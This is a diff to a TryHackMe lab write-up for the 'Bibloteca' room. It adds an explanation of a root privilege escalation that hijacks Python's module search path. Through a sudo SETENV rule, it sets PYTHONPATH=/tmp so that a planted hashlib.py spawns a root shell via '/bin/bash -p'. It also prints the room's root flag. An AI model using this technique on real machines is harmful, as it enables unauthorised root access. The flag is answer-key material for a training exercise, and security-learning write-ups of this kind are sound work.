@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-27T08:58:14.003+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-27T09:05:28.823+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -219,6 +219,36 @@ And root is achieved. Now /root/root.txt can be read.
 `THM{PytH0n_LiBr@RY_H1j@acKIn6}`
 
 Root flag is acquired.
+
+**Breakdown of the Exploit**
+```bash
+# sudo-l reveals hazel can change the environmental variables > SETENV
+# Thus we can tell python where to look for modules it's using to run hasher.py.
+
+1. First create the malicious hashlib.py since hasher.py is using it.
+2. Second add /tmp to the PYTHONPATH where the malicious hashlib.py is stored.
+3. Also add the hasher.py to PYTHONPATH
+
+
+# Sets the /tmp to the PYTHON environmental path
+sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
+
+This vulnerability arises due to this rule:
+(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
+
+What comes after /tmp allows to execute the hasher.py python3 with root privileges 
+
+
+---
+hasher.py runs as root
+→ imports hashlib
+→ Python searches PYTHONPATH first (/tmp)
+→ finds the malicious /tmp/hashlib.py
+→ executes it as root instead of real hashlib
+→ the os.system("/bin/bash -p") runs as root
+→ root shell spawns
+
+```
 
 ------
 ## Attack Pattern Analysis (APA)
